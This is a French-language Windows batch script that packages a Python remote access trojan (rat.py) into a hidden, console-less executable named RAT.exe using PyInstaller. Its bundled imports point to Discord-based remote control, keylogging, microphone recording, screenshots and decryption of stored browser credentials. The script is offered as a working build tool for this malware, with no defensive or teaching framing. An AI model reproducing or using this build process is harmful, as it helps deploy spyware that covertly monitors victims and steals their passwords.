@echo off
chcp 65001 >nul
title Compilation RAT PyInstaller

echo [INFO] Preparation de la compilation...

:: Verification de PyInstaller
python -m pyinstaller --version >nul 2>&1
if errorlevel 1 (
    echo [ERREUR] PyInstaller n'est pas installe!
    echo Installation de PyInstaller...
    pip install pyinstaller
)

:: Nom de votre script principal
set SCRIPT_NAME=rat.py

:: Verification que le script existe
if not exist "%SCRIPT_NAME%" (
    echo [ERREUR] Le script %SCRIPT_NAME% n'existe pas!
    pause
    exit /b 1
)

echo [INFO] Compilation en cours...
echo [INFO] Cette operation peut prendre plusieurs minutes...

:: Commande de compilation avec masquage des dependances
pyinstaller --onefile --noconsole ^
--hidden-import=discord ^
--hidden-import=discord.ext.commands ^
--hidden-import=pyaudio ^
--hidden-import=pynput.keyboard ^
--hidden-import=pyscreenshot ^
--hidden-import=pyttsx3 ^
--hidden-import=psutil ^
--hidden-import=comtypes ^
--hidden-import=win32crypt ^
--hidden-import=Crypto.Cipher.AES ^
--hidden-import=asyncio ^
--hidden-import=os ^
--hidden-import=time ^
--hidden-import=subprocess ^
--hidden-import=threading ^
--hidden-import=keyboard ^
--hidden-import=wave ^
--hidden-import=io ^
--hidden-import=sys ^
--hidden-import=shutil ^
--hidden-import=datetime ^
--hidden-import=random ^
--hidden-import=socket ^
--hidden-import=platform ^
--hidden-import=getpass ^
--hidden-import=webbrowser ^
--hidden-import=requests ^
--hidden-import=zipfile ^
--hidden-import=json ^
--hidden-import=urllib.request ^
--hidden-import=base64 ^
--hidden-import=re ^
--hidden-import=ctypes ^
--icon=NONE ^
--name=RAT ^
rat.py

if errorlevel 1 (
    echo [ERREUR] La compilation a echoue!
    pause
    exit /b 1
)

echo [SUCCES] Compilation terminee avec succes!
echo [INFO] L'executable se trouve dans le dossier: dist\RAT.exe
echo [INFO] Nettoyage des fichiers temporaires...

:: Suppression des dossiers temporaires
if exist build rmdir /s /q build
if exist __pycache__ rmdir /s /q __pycache__

echo.
echo [TERMINE] Votre executable RAT.exe est pret!
pause